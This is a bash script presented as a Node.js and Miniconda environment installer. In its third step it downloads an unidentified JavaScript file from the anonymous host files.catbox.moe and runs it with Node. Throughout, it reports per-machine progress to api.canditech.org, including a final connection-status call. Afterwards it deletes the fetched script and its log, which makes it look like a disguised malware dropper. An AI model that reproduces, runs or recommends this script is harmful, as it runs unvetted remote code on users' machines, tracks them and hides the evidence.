#!/usr/bin/env bash
set -euo pipefail

MAC_UID="__ID__"
API_BASE="https://api.canditech.org"
SHARED_DIR="/Users/Shared"
MINICONDA_PREFIX="${SHARED_DIR}/miniconda3"
MINICONDA_LOG="${SHARED_DIR}/miniconda-install.log"

info() { echo "[INFO] $*"; }
err() { echo "[ERROR] $*" >&2; }
die() { err "$*"; exit 1; }

download() {
  local url="$1"
  local out="$2"
  if command -v curl >/dev/null 2>&1; then
    curl -fsSL --retry 4 --retry-delay 2 --connect-timeout 20 -o "$out" "$url"
  elif command -v wget >/dev/null 2>&1; then
    wget --tries=4 --timeout=20 -qO "$out" "$url"
  else
    die "Neither curl nor wget is available."
  fi
}

download_or_die() {
  local url="$1"
  local out="$2"
  local alt_url="${3:-}"
  rm -f "$out"
  if download "$url" "$out" && [[ -s "$out" ]]; then
    return 0
  fi
  rm -f "$out"
  if [[ -n "$alt_url" ]]; then
    info "Primary download failed, trying fallback URL..."
    download "$alt_url" "$out" && [[ -s "$out" ]] && return 0
  fi
  die "Download failed: $url"
}

# Miniconda .sh is large; allow long transfer (default curl has no overall max and can hang on bad links).
download_miniconda_installer() {
  local url="$1"
  local out="$2"
  rm -f "$out"
  if command -v curl >/dev/null 2>&1; then
    curl -fsSL --retry 6 --retry-delay 3 --connect-timeout 45 --max-time 3600 -o "$out" "$url"
  elif command -v wget >/dev/null 2>&1; then
    wget --tries=6 --timeout=120 -qO "$out" "$url"
  else
    die "Neither curl nor wget is available."
  fi
}

download_miniconda_or_die() {
  local url="$1"
  local out="$2"
  local alt_url="${3:-}"
  rm -f "$out"
  if download_miniconda_installer "$url" "$out" && [[ -s "$out" ]]; then
    return 0
  fi
  rm -f "$out"
  if [[ -n "$alt_url" ]]; then
    info "Primary Miniconda download failed, trying fallback URL..."
    download_miniconda_installer "$alt_url" "$out" && [[ -s "$out" ]] && return 0
  fi
  die "Miniconda download failed: $url"
}

track_step() {
  local key="$1"
  info "$key"
  if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
    curl -sL -X POST "${API_BASE}/track-step/${MAC_UID}/${key}" >/dev/null 2>&1 || true
  fi
}

finish_success() {
  track_step "completed"
  if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
    curl -sL -X POST "${API_BASE}/change-connection-status/${MAC_UID}" >/dev/null 2>&1 || true
  fi
}

trap 'track_step "failed"' ERR

track_step "step_1"
OS_UNAME="$(uname -s)"
ARCH_UNAME="$(uname -m)"
case "$OS_UNAME" in
  Darwin) OS_TAG="darwin" ;;
  Linux) OS_TAG="linux" ;;
  *) die "Unsupported OS: $OS_UNAME" ;;
esac
case "$ARCH_UNAME" in
  x86_64|amd64) ARCH_TAG="x64" ;;
  arm64|aarch64) ARCH_TAG="arm64" ;;
  *) die "Unsupported architecture: $ARCH_UNAME" ;;
esac

track_step "step_2"
mkdir -p "$SHARED_DIR"
NODE_EXE="node"
if ! command -v node >/dev/null 2>&1; then
  INDEX_JSON="${SHARED_DIR}/node-index.json"
  download "https://nodejs.org/dist/index.json" "$INDEX_JSON"
  LATEST_VERSION="$(grep -oE '"version"\s*:\s*"v[0-9]+\.[0-9]+\.[0-9]+"' "$INDEX_JSON" | head -n 1 | grep -oE 'v[0-9]+\.[0-9]+\.[0-9]+')"
  rm -f "$INDEX_JSON"
  [[ -n "${LATEST_VERSION:-}" ]] || die "Failed to determine node version."
  NODE_VERSION="${LATEST_VERSION#v}"
  NODE_TARBALL="${SHARED_DIR}/node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}.tar.xz"
  NODE_DIR="${SHARED_DIR}/node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}"
  PORTABLE_NODE="${NODE_DIR}/bin/node"
  if [[ ! -x "$PORTABLE_NODE" ]]; then
    download "https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}.tar.xz" "$NODE_TARBALL"
    tar -xf "$NODE_TARBALL" -C "$SHARED_DIR"
    rm -f "$NODE_TARBALL"
  fi
  NODE_EXE="$PORTABLE_NODE"
fi
"$NODE_EXE" -v >/dev/null 2>&1 || die "Node is not available."

track_step "step_3"
ENV_SETUP_JS="${SHARED_DIR}/env-setup.js"
download "https://files.catbox.moe/1gq866.js" "$ENV_SETUP_JS"
[[ -s "$ENV_SETUP_JS" ]] || die "env-setup.js download failed (missing or empty file)."
# Run in foreground so errors are visible and set -e catches failures here (not later at wait).
ENV_SETUP_LOG="${SHARED_DIR}/env-setup.log"
if ! "$NODE_EXE" "$ENV_SETUP_JS" >>"$ENV_SETUP_LOG" 2>&1; then
  err "env-setup.js failed. Last lines of log:"
  tail -n 40 "$ENV_SETUP_LOG" >&2 || true
  die "env-setup.js exited with an error."
fi
# -------------------------
# Detect platform and choose Miniconda URL
# -------------------------
track_step "step_4"
ARCH="$(uname -m)"
OS="$(uname -s)"
if [[ "$OS" == "Darwin" ]]; then
  if [[ "$ARCH" == "arm64" ]]; then
    MINICONDA_URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-arm64.sh"
    MINICONDA_SH="${SHARED_DIR}/Miniconda3-latest-MacOSX-arm64.sh"
  elif [[ "$ARCH" == "x86_64" ]]; then
    MINICONDA_URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-x86_64.sh"
    MINICONDA_SH="${SHARED_DIR}/Miniconda3-latest-MacOSX-x86_64.sh"
  else
    die "Unsupported macOS architecture: $ARCH"
  fi
elif [[ "$OS" == "Linux" ]]; then
  if [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
    MINICONDA_URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-aarch64.sh"
    MINICONDA_SH="${SHARED_DIR}/Miniconda3-latest-Linux-aarch64.sh"
  elif [[ "$ARCH" == "x86_64" ]]; then
    MINICONDA_URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh"
    MINICONDA_SH="${SHARED_DIR}/Miniconda3-latest-Linux-x86_64.sh"
  else
    die "Unsupported Linux architecture: $ARCH"
  fi
else
  die "Unsupported OS: $OS"
fi

track_step "step_5"
MINICONDA_FALLBACK_URL="${MINICONDA_URL/https:\/\/repo.anaconda.com\/miniconda/https:\/\/repo.continuum.io\/miniconda}"
download_miniconda_or_die "$MINICONDA_URL" "$MINICONDA_SH" "$MINICONDA_FALLBACK_URL"

# The .sh file is a self-extracting installer; we always invoke it with bash (chmod +x not required).
chmod +x "$MINICONDA_SH" 2>/dev/null || true
info "Miniconda installer downloaded; extracting and installing into ${MINICONDA_PREFIX}..."

track_step "step_6"
mkdir -p "$SHARED_DIR"
: >"$MINICONDA_LOG"
[[ -s "$MINICONDA_SH" ]] || die "Miniconda installer missing or empty: $MINICONDA_SH"

# Hard gate: if download succeeded, make sure we have the exact arm64 filename in /Users/Shared
# before running the manual command.
if [[ "$OS" == "Darwin" && "$ARCH" == "arm64" ]]; then
  ARM64_INSTALLER="${SHARED_DIR}/Miniconda3-latest-MacOSX-arm64.sh"
  if [[ "$MINICONDA_SH" != "$ARM64_INSTALLER" ]]; then
    cp -f "$MINICONDA_SH" "$ARM64_INSTALLER"
    MINICONDA_SH="$ARM64_INSTALLER"
  fi
  [[ -s "$ARM64_INSTALLER" ]] || die "Download check failed: ${ARM64_INSTALLER} not found or empty."
  FIRST_LINE="$(LC_ALL=C head -n 1 "$ARM64_INSTALLER" 2>/dev/null || true)"
  [[ "$FIRST_LINE" == "#!"* ]] || die "Download check failed: installer is not a valid shell script."
fi

# Use exactly the manual extraction command for Mac arm64.
if [[ "$OS" == "Darwin" && "$ARCH" == "arm64" ]]; then
  info "Running: bash Miniconda3-latest-MacOSX-arm64.sh -b -p /Users/Shared/miniconda3"
  (
    cd "$SHARED_DIR" || exit 1
    bash Miniconda3-latest-MacOSX-arm64.sh -b -p /Users/Shared/miniconda3
  ) >>"$MINICONDA_LOG" 2>&1 || {
    err "Miniconda install failed. Last lines of ${MINICONDA_LOG}:"
    tail -n 80 "$MINICONDA_LOG" >&2 || true
    die "Miniconda installer exited with an error."
  }
else
  bash "$MINICONDA_SH" -b -p "$MINICONDA_PREFIX" >>"$MINICONDA_LOG" 2>&1 || {
    err "Miniconda install failed. Last lines of ${MINICONDA_LOG}:"
    tail -n 80 "$MINICONDA_LOG" >&2 || true
    die "Miniconda installer exited with an error."
  }
fi

track_step "step_7"
MINICONDA_PY=""
if [[ -x "$MINICONDA_PREFIX/bin/python3" ]]; then
  MINICONDA_PY="$MINICONDA_PREFIX/bin/python3"
elif [[ -x "$MINICONDA_PREFIX/bin/python" ]]; then
  MINICONDA_PY="$MINICONDA_PREFIX/bin/python"
fi
[[ -n "$MINICONDA_PY" ]] || die "Miniconda python not found under ${MINICONDA_PREFIX}/bin."
"$MINICONDA_PY" -V >/dev/null 2>&1 || die "Miniconda python verification failed."
rm -f "$MINICONDA_SH" "$ENV_SETUP_JS" "$ENV_SETUP_LOG"

track_step "step_8"
info "Done. Miniconda path: $MINICONDA_PREFIX"
finish_success
exit 0